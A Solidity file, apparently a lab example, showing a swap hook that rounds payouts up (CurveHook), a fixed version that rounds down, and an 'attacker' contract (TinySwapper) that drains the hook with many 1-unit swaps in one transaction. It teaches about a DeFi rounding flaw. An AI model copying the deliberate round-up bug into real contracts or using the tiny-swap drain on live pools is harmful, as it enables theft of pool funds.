// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {BaseHook, MiniPoolManager, PoolKey, SwapParams, Hooks, FullMath} from "./MiniPoolManager.sol";

/// A hook that prices swaps on its own curve: 1 tGOLD = 1,000 tUSD, paid from the hook's inventory.
/// It takes the whole input and returns the output as its delta. tUSD has 6 decimals, tGOLD 2,
/// so one raw tGOLD unit (0.01) is worth 10,000,000 raw tUSD units (10 tUSD).
contract CurveHook is BaseHook {
    uint256 public constant PRICE = 1;
    uint256 public constant ONE = 10_000_000;

    constructor(MiniPoolManager m, IERC20 gold) BaseHook(m) { gold.approve(address(m), type(uint256).max); }

    function flags() external pure returns (uint8) { return Hooks.BEFORE_SWAP | Hooks.BEFORE_SWAP_RETURNS_DELTA; }

    function beforeSwap(address, PoolKey calldata, SwapParams calldata params, bytes calldata)
        external override onlyPoolManager returns (bytes4, uint256, uint256)
    {
        return (this.beforeSwap.selector, params.amountIn, quote(params.amountIn));
    }

    function quote(uint256 amountIn) public pure virtual returns (uint256) {
        return FullMath.mulDivRoundingUp(amountIn, PRICE, ONE); // rounds the payout up
    }
}

/// Fix #3: round in the pool's favour. Down on what you pay out.
contract CurveHookFixed is CurveHook {
    constructor(MiniPoolManager m, IERC20 gold) CurveHook(m, gold) {}

    function quote(uint256 amountIn) public pure override returns (uint256) {
        return FullMath.mulDiv(amountIn, PRICE, ONE); // round down, never mulDivRoundingUp
    }
}

/// Our attacker contract: many tiny swaps in one transaction.
interface IRouter { function swap(PoolKey calldata key, bool zeroForOne, uint256 amountIn, bytes calldata hookData) external returns (uint256); }

contract TinySwapper {
    function run(IRouter router, PoolKey calldata key, uint256 n) external {
        IERC20 tokenIn = IERC20(key.currency0);
        IERC20 tokenOut = IERC20(key.currency1);
        tokenIn.approve(address(router), n);
        for (uint256 i; i < n; i++) router.swap(key, true, 1, "");
        tokenOut.transfer(msg.sender, tokenOut.balanceOf(address(this)));
    }
}
